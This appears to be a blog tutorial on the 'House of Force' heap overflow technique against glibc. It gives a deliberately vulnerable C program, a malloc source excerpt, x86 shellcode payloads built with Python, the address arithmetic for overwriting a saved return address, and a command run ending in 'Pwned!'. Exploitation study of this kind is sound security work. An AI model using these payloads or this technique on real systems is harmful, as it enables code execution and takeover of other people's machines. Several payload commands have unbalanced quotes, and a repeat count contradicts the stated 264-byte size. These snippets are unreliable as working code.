Ingredients:

* The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness
* There is a malloc() call with an exploiter-controllable size
* There is another malloc() call where data are controlled by the exploiter

As you can see from the recipe, this technique is strongly based on the top chunk (a.k.a. the wilderness): as you can remember from the first article on heap overflows, the top chunk is a very peculiar one. It looks like a normal chunk, with its header followed by the data section, but, on the other side, it’s at the end of the heap and it’s the only chunk that can be extended or shortened. So, no matter what happens, the top chunk MUST always exist and that’s why it’s treated differently both by malloc() and free() (and can’t be passed as argument to free()).   

I took blackngel’s original example and slightly modified it.  
``` c
 /*
 * blackngel's original example slightly modified
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void fvuln(unsigned long len, char *str, char *buf)
{
  char *ptr1, *ptr2, *ptr3;

  ptr1 = malloc(256);
  printf("PTR1 = [ %p ]\n", ptr1);
  strcpy(ptr1, str);

  printf("Allocated MEM: %lu bytes\n", len);
  ptr2 = malloc(len);
  ptr3 = malloc(256);

  strcpy(ptr3, buf);
}

int main(int argc, char *argv[])
{
  char *pEnd;
  if (argc == 4)
    fvuln(strtoull(argv[1], &pEnd, 10), argv[2], argv[3]);

  return 0;
}
```
So, the core of this technique is to overwrite av->top with an arbitrary value: in fact, once the attacker has the control over this value, if he can force a call to malloc() which uses the top chunk, he can control where the next chunk will be allocated and be able to write arbitrary bytes to any address.  

By keeping the 2.3.5 version of the malloc() implementation in mind, let’s see how it’s possible to perform the first step of this attack: overwriting av->top. At lines #3845 and #[4151](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l4151), there is the following code:   
``` c
 Void_t*
_int_malloc(mstate av, size_t bytes)
{
  INTERNAL_SIZE_T nb;               /* normalized request size */

[...]

  mchunkptr       victim;           /* inspected/selected chunk */
  INTERNAL_SIZE_T size;             /* its size */
  int             victim_index;     /* its bin index */

  mchunkptr       remainder;        /* remainder from a split */
  unsigned long   remainder_size;   /* its size */

[...]

  checked_request2size(bytes, nb);

[...]

  use_top:
    /*
      If large enough, split off the chunk bordering the end of memory
      (held in av->top). Note that this is in accord with the best-fit
      search rule.  In effect, av->top is treated as larger (and thus
      less well fitting) than any other available chunk since it can
      be extended to be as large as necessary (up to system
      limitations).

      We require that av->top always exists (i.e., has size >=
      MINSIZE) after initialization, so if it would otherwise be
      exhuasted by current request, it is replenished. (The main
      reason for ensuring it exists is that we may need MINSIZE space
      to put in fenceposts in sysmalloc.)
    */

    victim = av->top;
    size = chunksize(victim);

    if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
      remainder_size = size - nb;
      remainder = chunk_at_offset(victim, nb);
      av->top = remainder;
      set_head(victim, nb | PREV_INUSE |
        (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head(remainder, remainder_size | PREV_INUSE);

      check_malloced_chunk(av, victim, nb);
      return chunk2mem(victim);
    }

[...]
```
In the Malloc Maleficarum it is written that the wilderness chunk should have the highest size possible (preferably 0xFFFFFFFF). As the overflowing chunk is 256 bytes long, filling it with 264 “\xFF” characters will make it happen. Doing this has the nice consequence of handling any other large memory request inside the malloc() itself, instead of requesting an heap expansion.  

When malloc(len) will be called, the new wilderness’ location will be computed by adding the normalized requested size to the old location of the top chunk by using the chunk_at_offset macro. Once this value is computed, av->top is set to it. The important thing is to let this value to point to an area under the exploiter’s control (may be the stack, or a .got/.dtors entry, or whatever). Truth be told, this value must be 8 bytes before the target area.  

Once this is done, the pointer returned from the next malloc call will return the aforementioned value + 8 bytes (prev_size + size). This means that ptr3 will point directly to the stack or to the entry the exploiter chose or wherever desired. So, in this case, with a simple strcpy, the attacker can overwrite these interesting areas of memory.  

Years have passed by, but this bug has never been fixed in glibc: this means, that it’s time to test it on my glibc 2.20 linux box. As in the “House of Mind” post, I had to disable ASLR and to set the noexec kernel paramater to OFF. As my phylosophy has always been to disable the less possible, RELRO stays on and we won’t be able to overwrite any entry: stack time! (OK, I know that full RELRO is not on by default on gcc, so I could actually overwrite a .got entry, but anyway…)  

So, the first step is to “cook” the second application argument (argv[2]) in such a way that it overwrites the wilderness size. This is actually pretty simple, as a simple Python command can do the trick. As the whole task is performed only by the last four bytes of the string (which are set to “\xFF”), we have 256 bytes to store the shellcode.  
```
python -c 'import sys; sys.stdout.write("\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xFF" * (264 - 36))'
```
The next step is to understand which value is going to replace the returning address. But that’s, of course, ptr1‘s address (as that’s where our shellcode is). This address is printed by the code itself: Python will do the trick again.  

 `python -c 'import sys; sys.stdout.write("\x08\xB0\x04\x08`  
The last step is the trickiest one, as we need to compute the value that it’s going to be added to av->top in order to have the pushed-EIP (- 8) address as result. So, on my system, EIP was pushed at 0xFFFFCE5C and the wilderness was originally located at 0x0804B108. So, we need to compute  

`0xFFFFCE5C – 0x8 – 0x0804B108 = 0xF7FB1D4C = 4160429388`  

OK, so, we know now that nb must be equal to 4160429388. Due to the alignment that checked_request2size performs, the closest I could get to this value was 4160429384. Mmm… This means that I’m going to be 4 bytes before the returning address and that we need to change the last Python command. Anyway, in order to have 4160429388 as normalized value, I succeeded by using 4160429373.  

The previous Python command, so, becomes:  

 `python -c 'import sys; sys.stdout.write("A + "\x08\xB0\x04\x08")'`  
I know, we’re going to overwrite some variable’s value, but, at least in this scenario, it’s not that important. So, in the real end, the whole thing reduces to:  
```
 $ ./hof 4160429373 $(python -c 'import sys; sys.stdout.write("\xeb\x17\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x50\x77\x6e\x65\x64\x21\xFF" * (264 - 36))') $(python -c 'import sys; sys.stdout.write("A + "\x08\xB0\x04\x08")')
PTR1 = [ 0x804b008 ]
Allocated MEM: 4160429373 bytes
Pwned!$
```
There you have it!  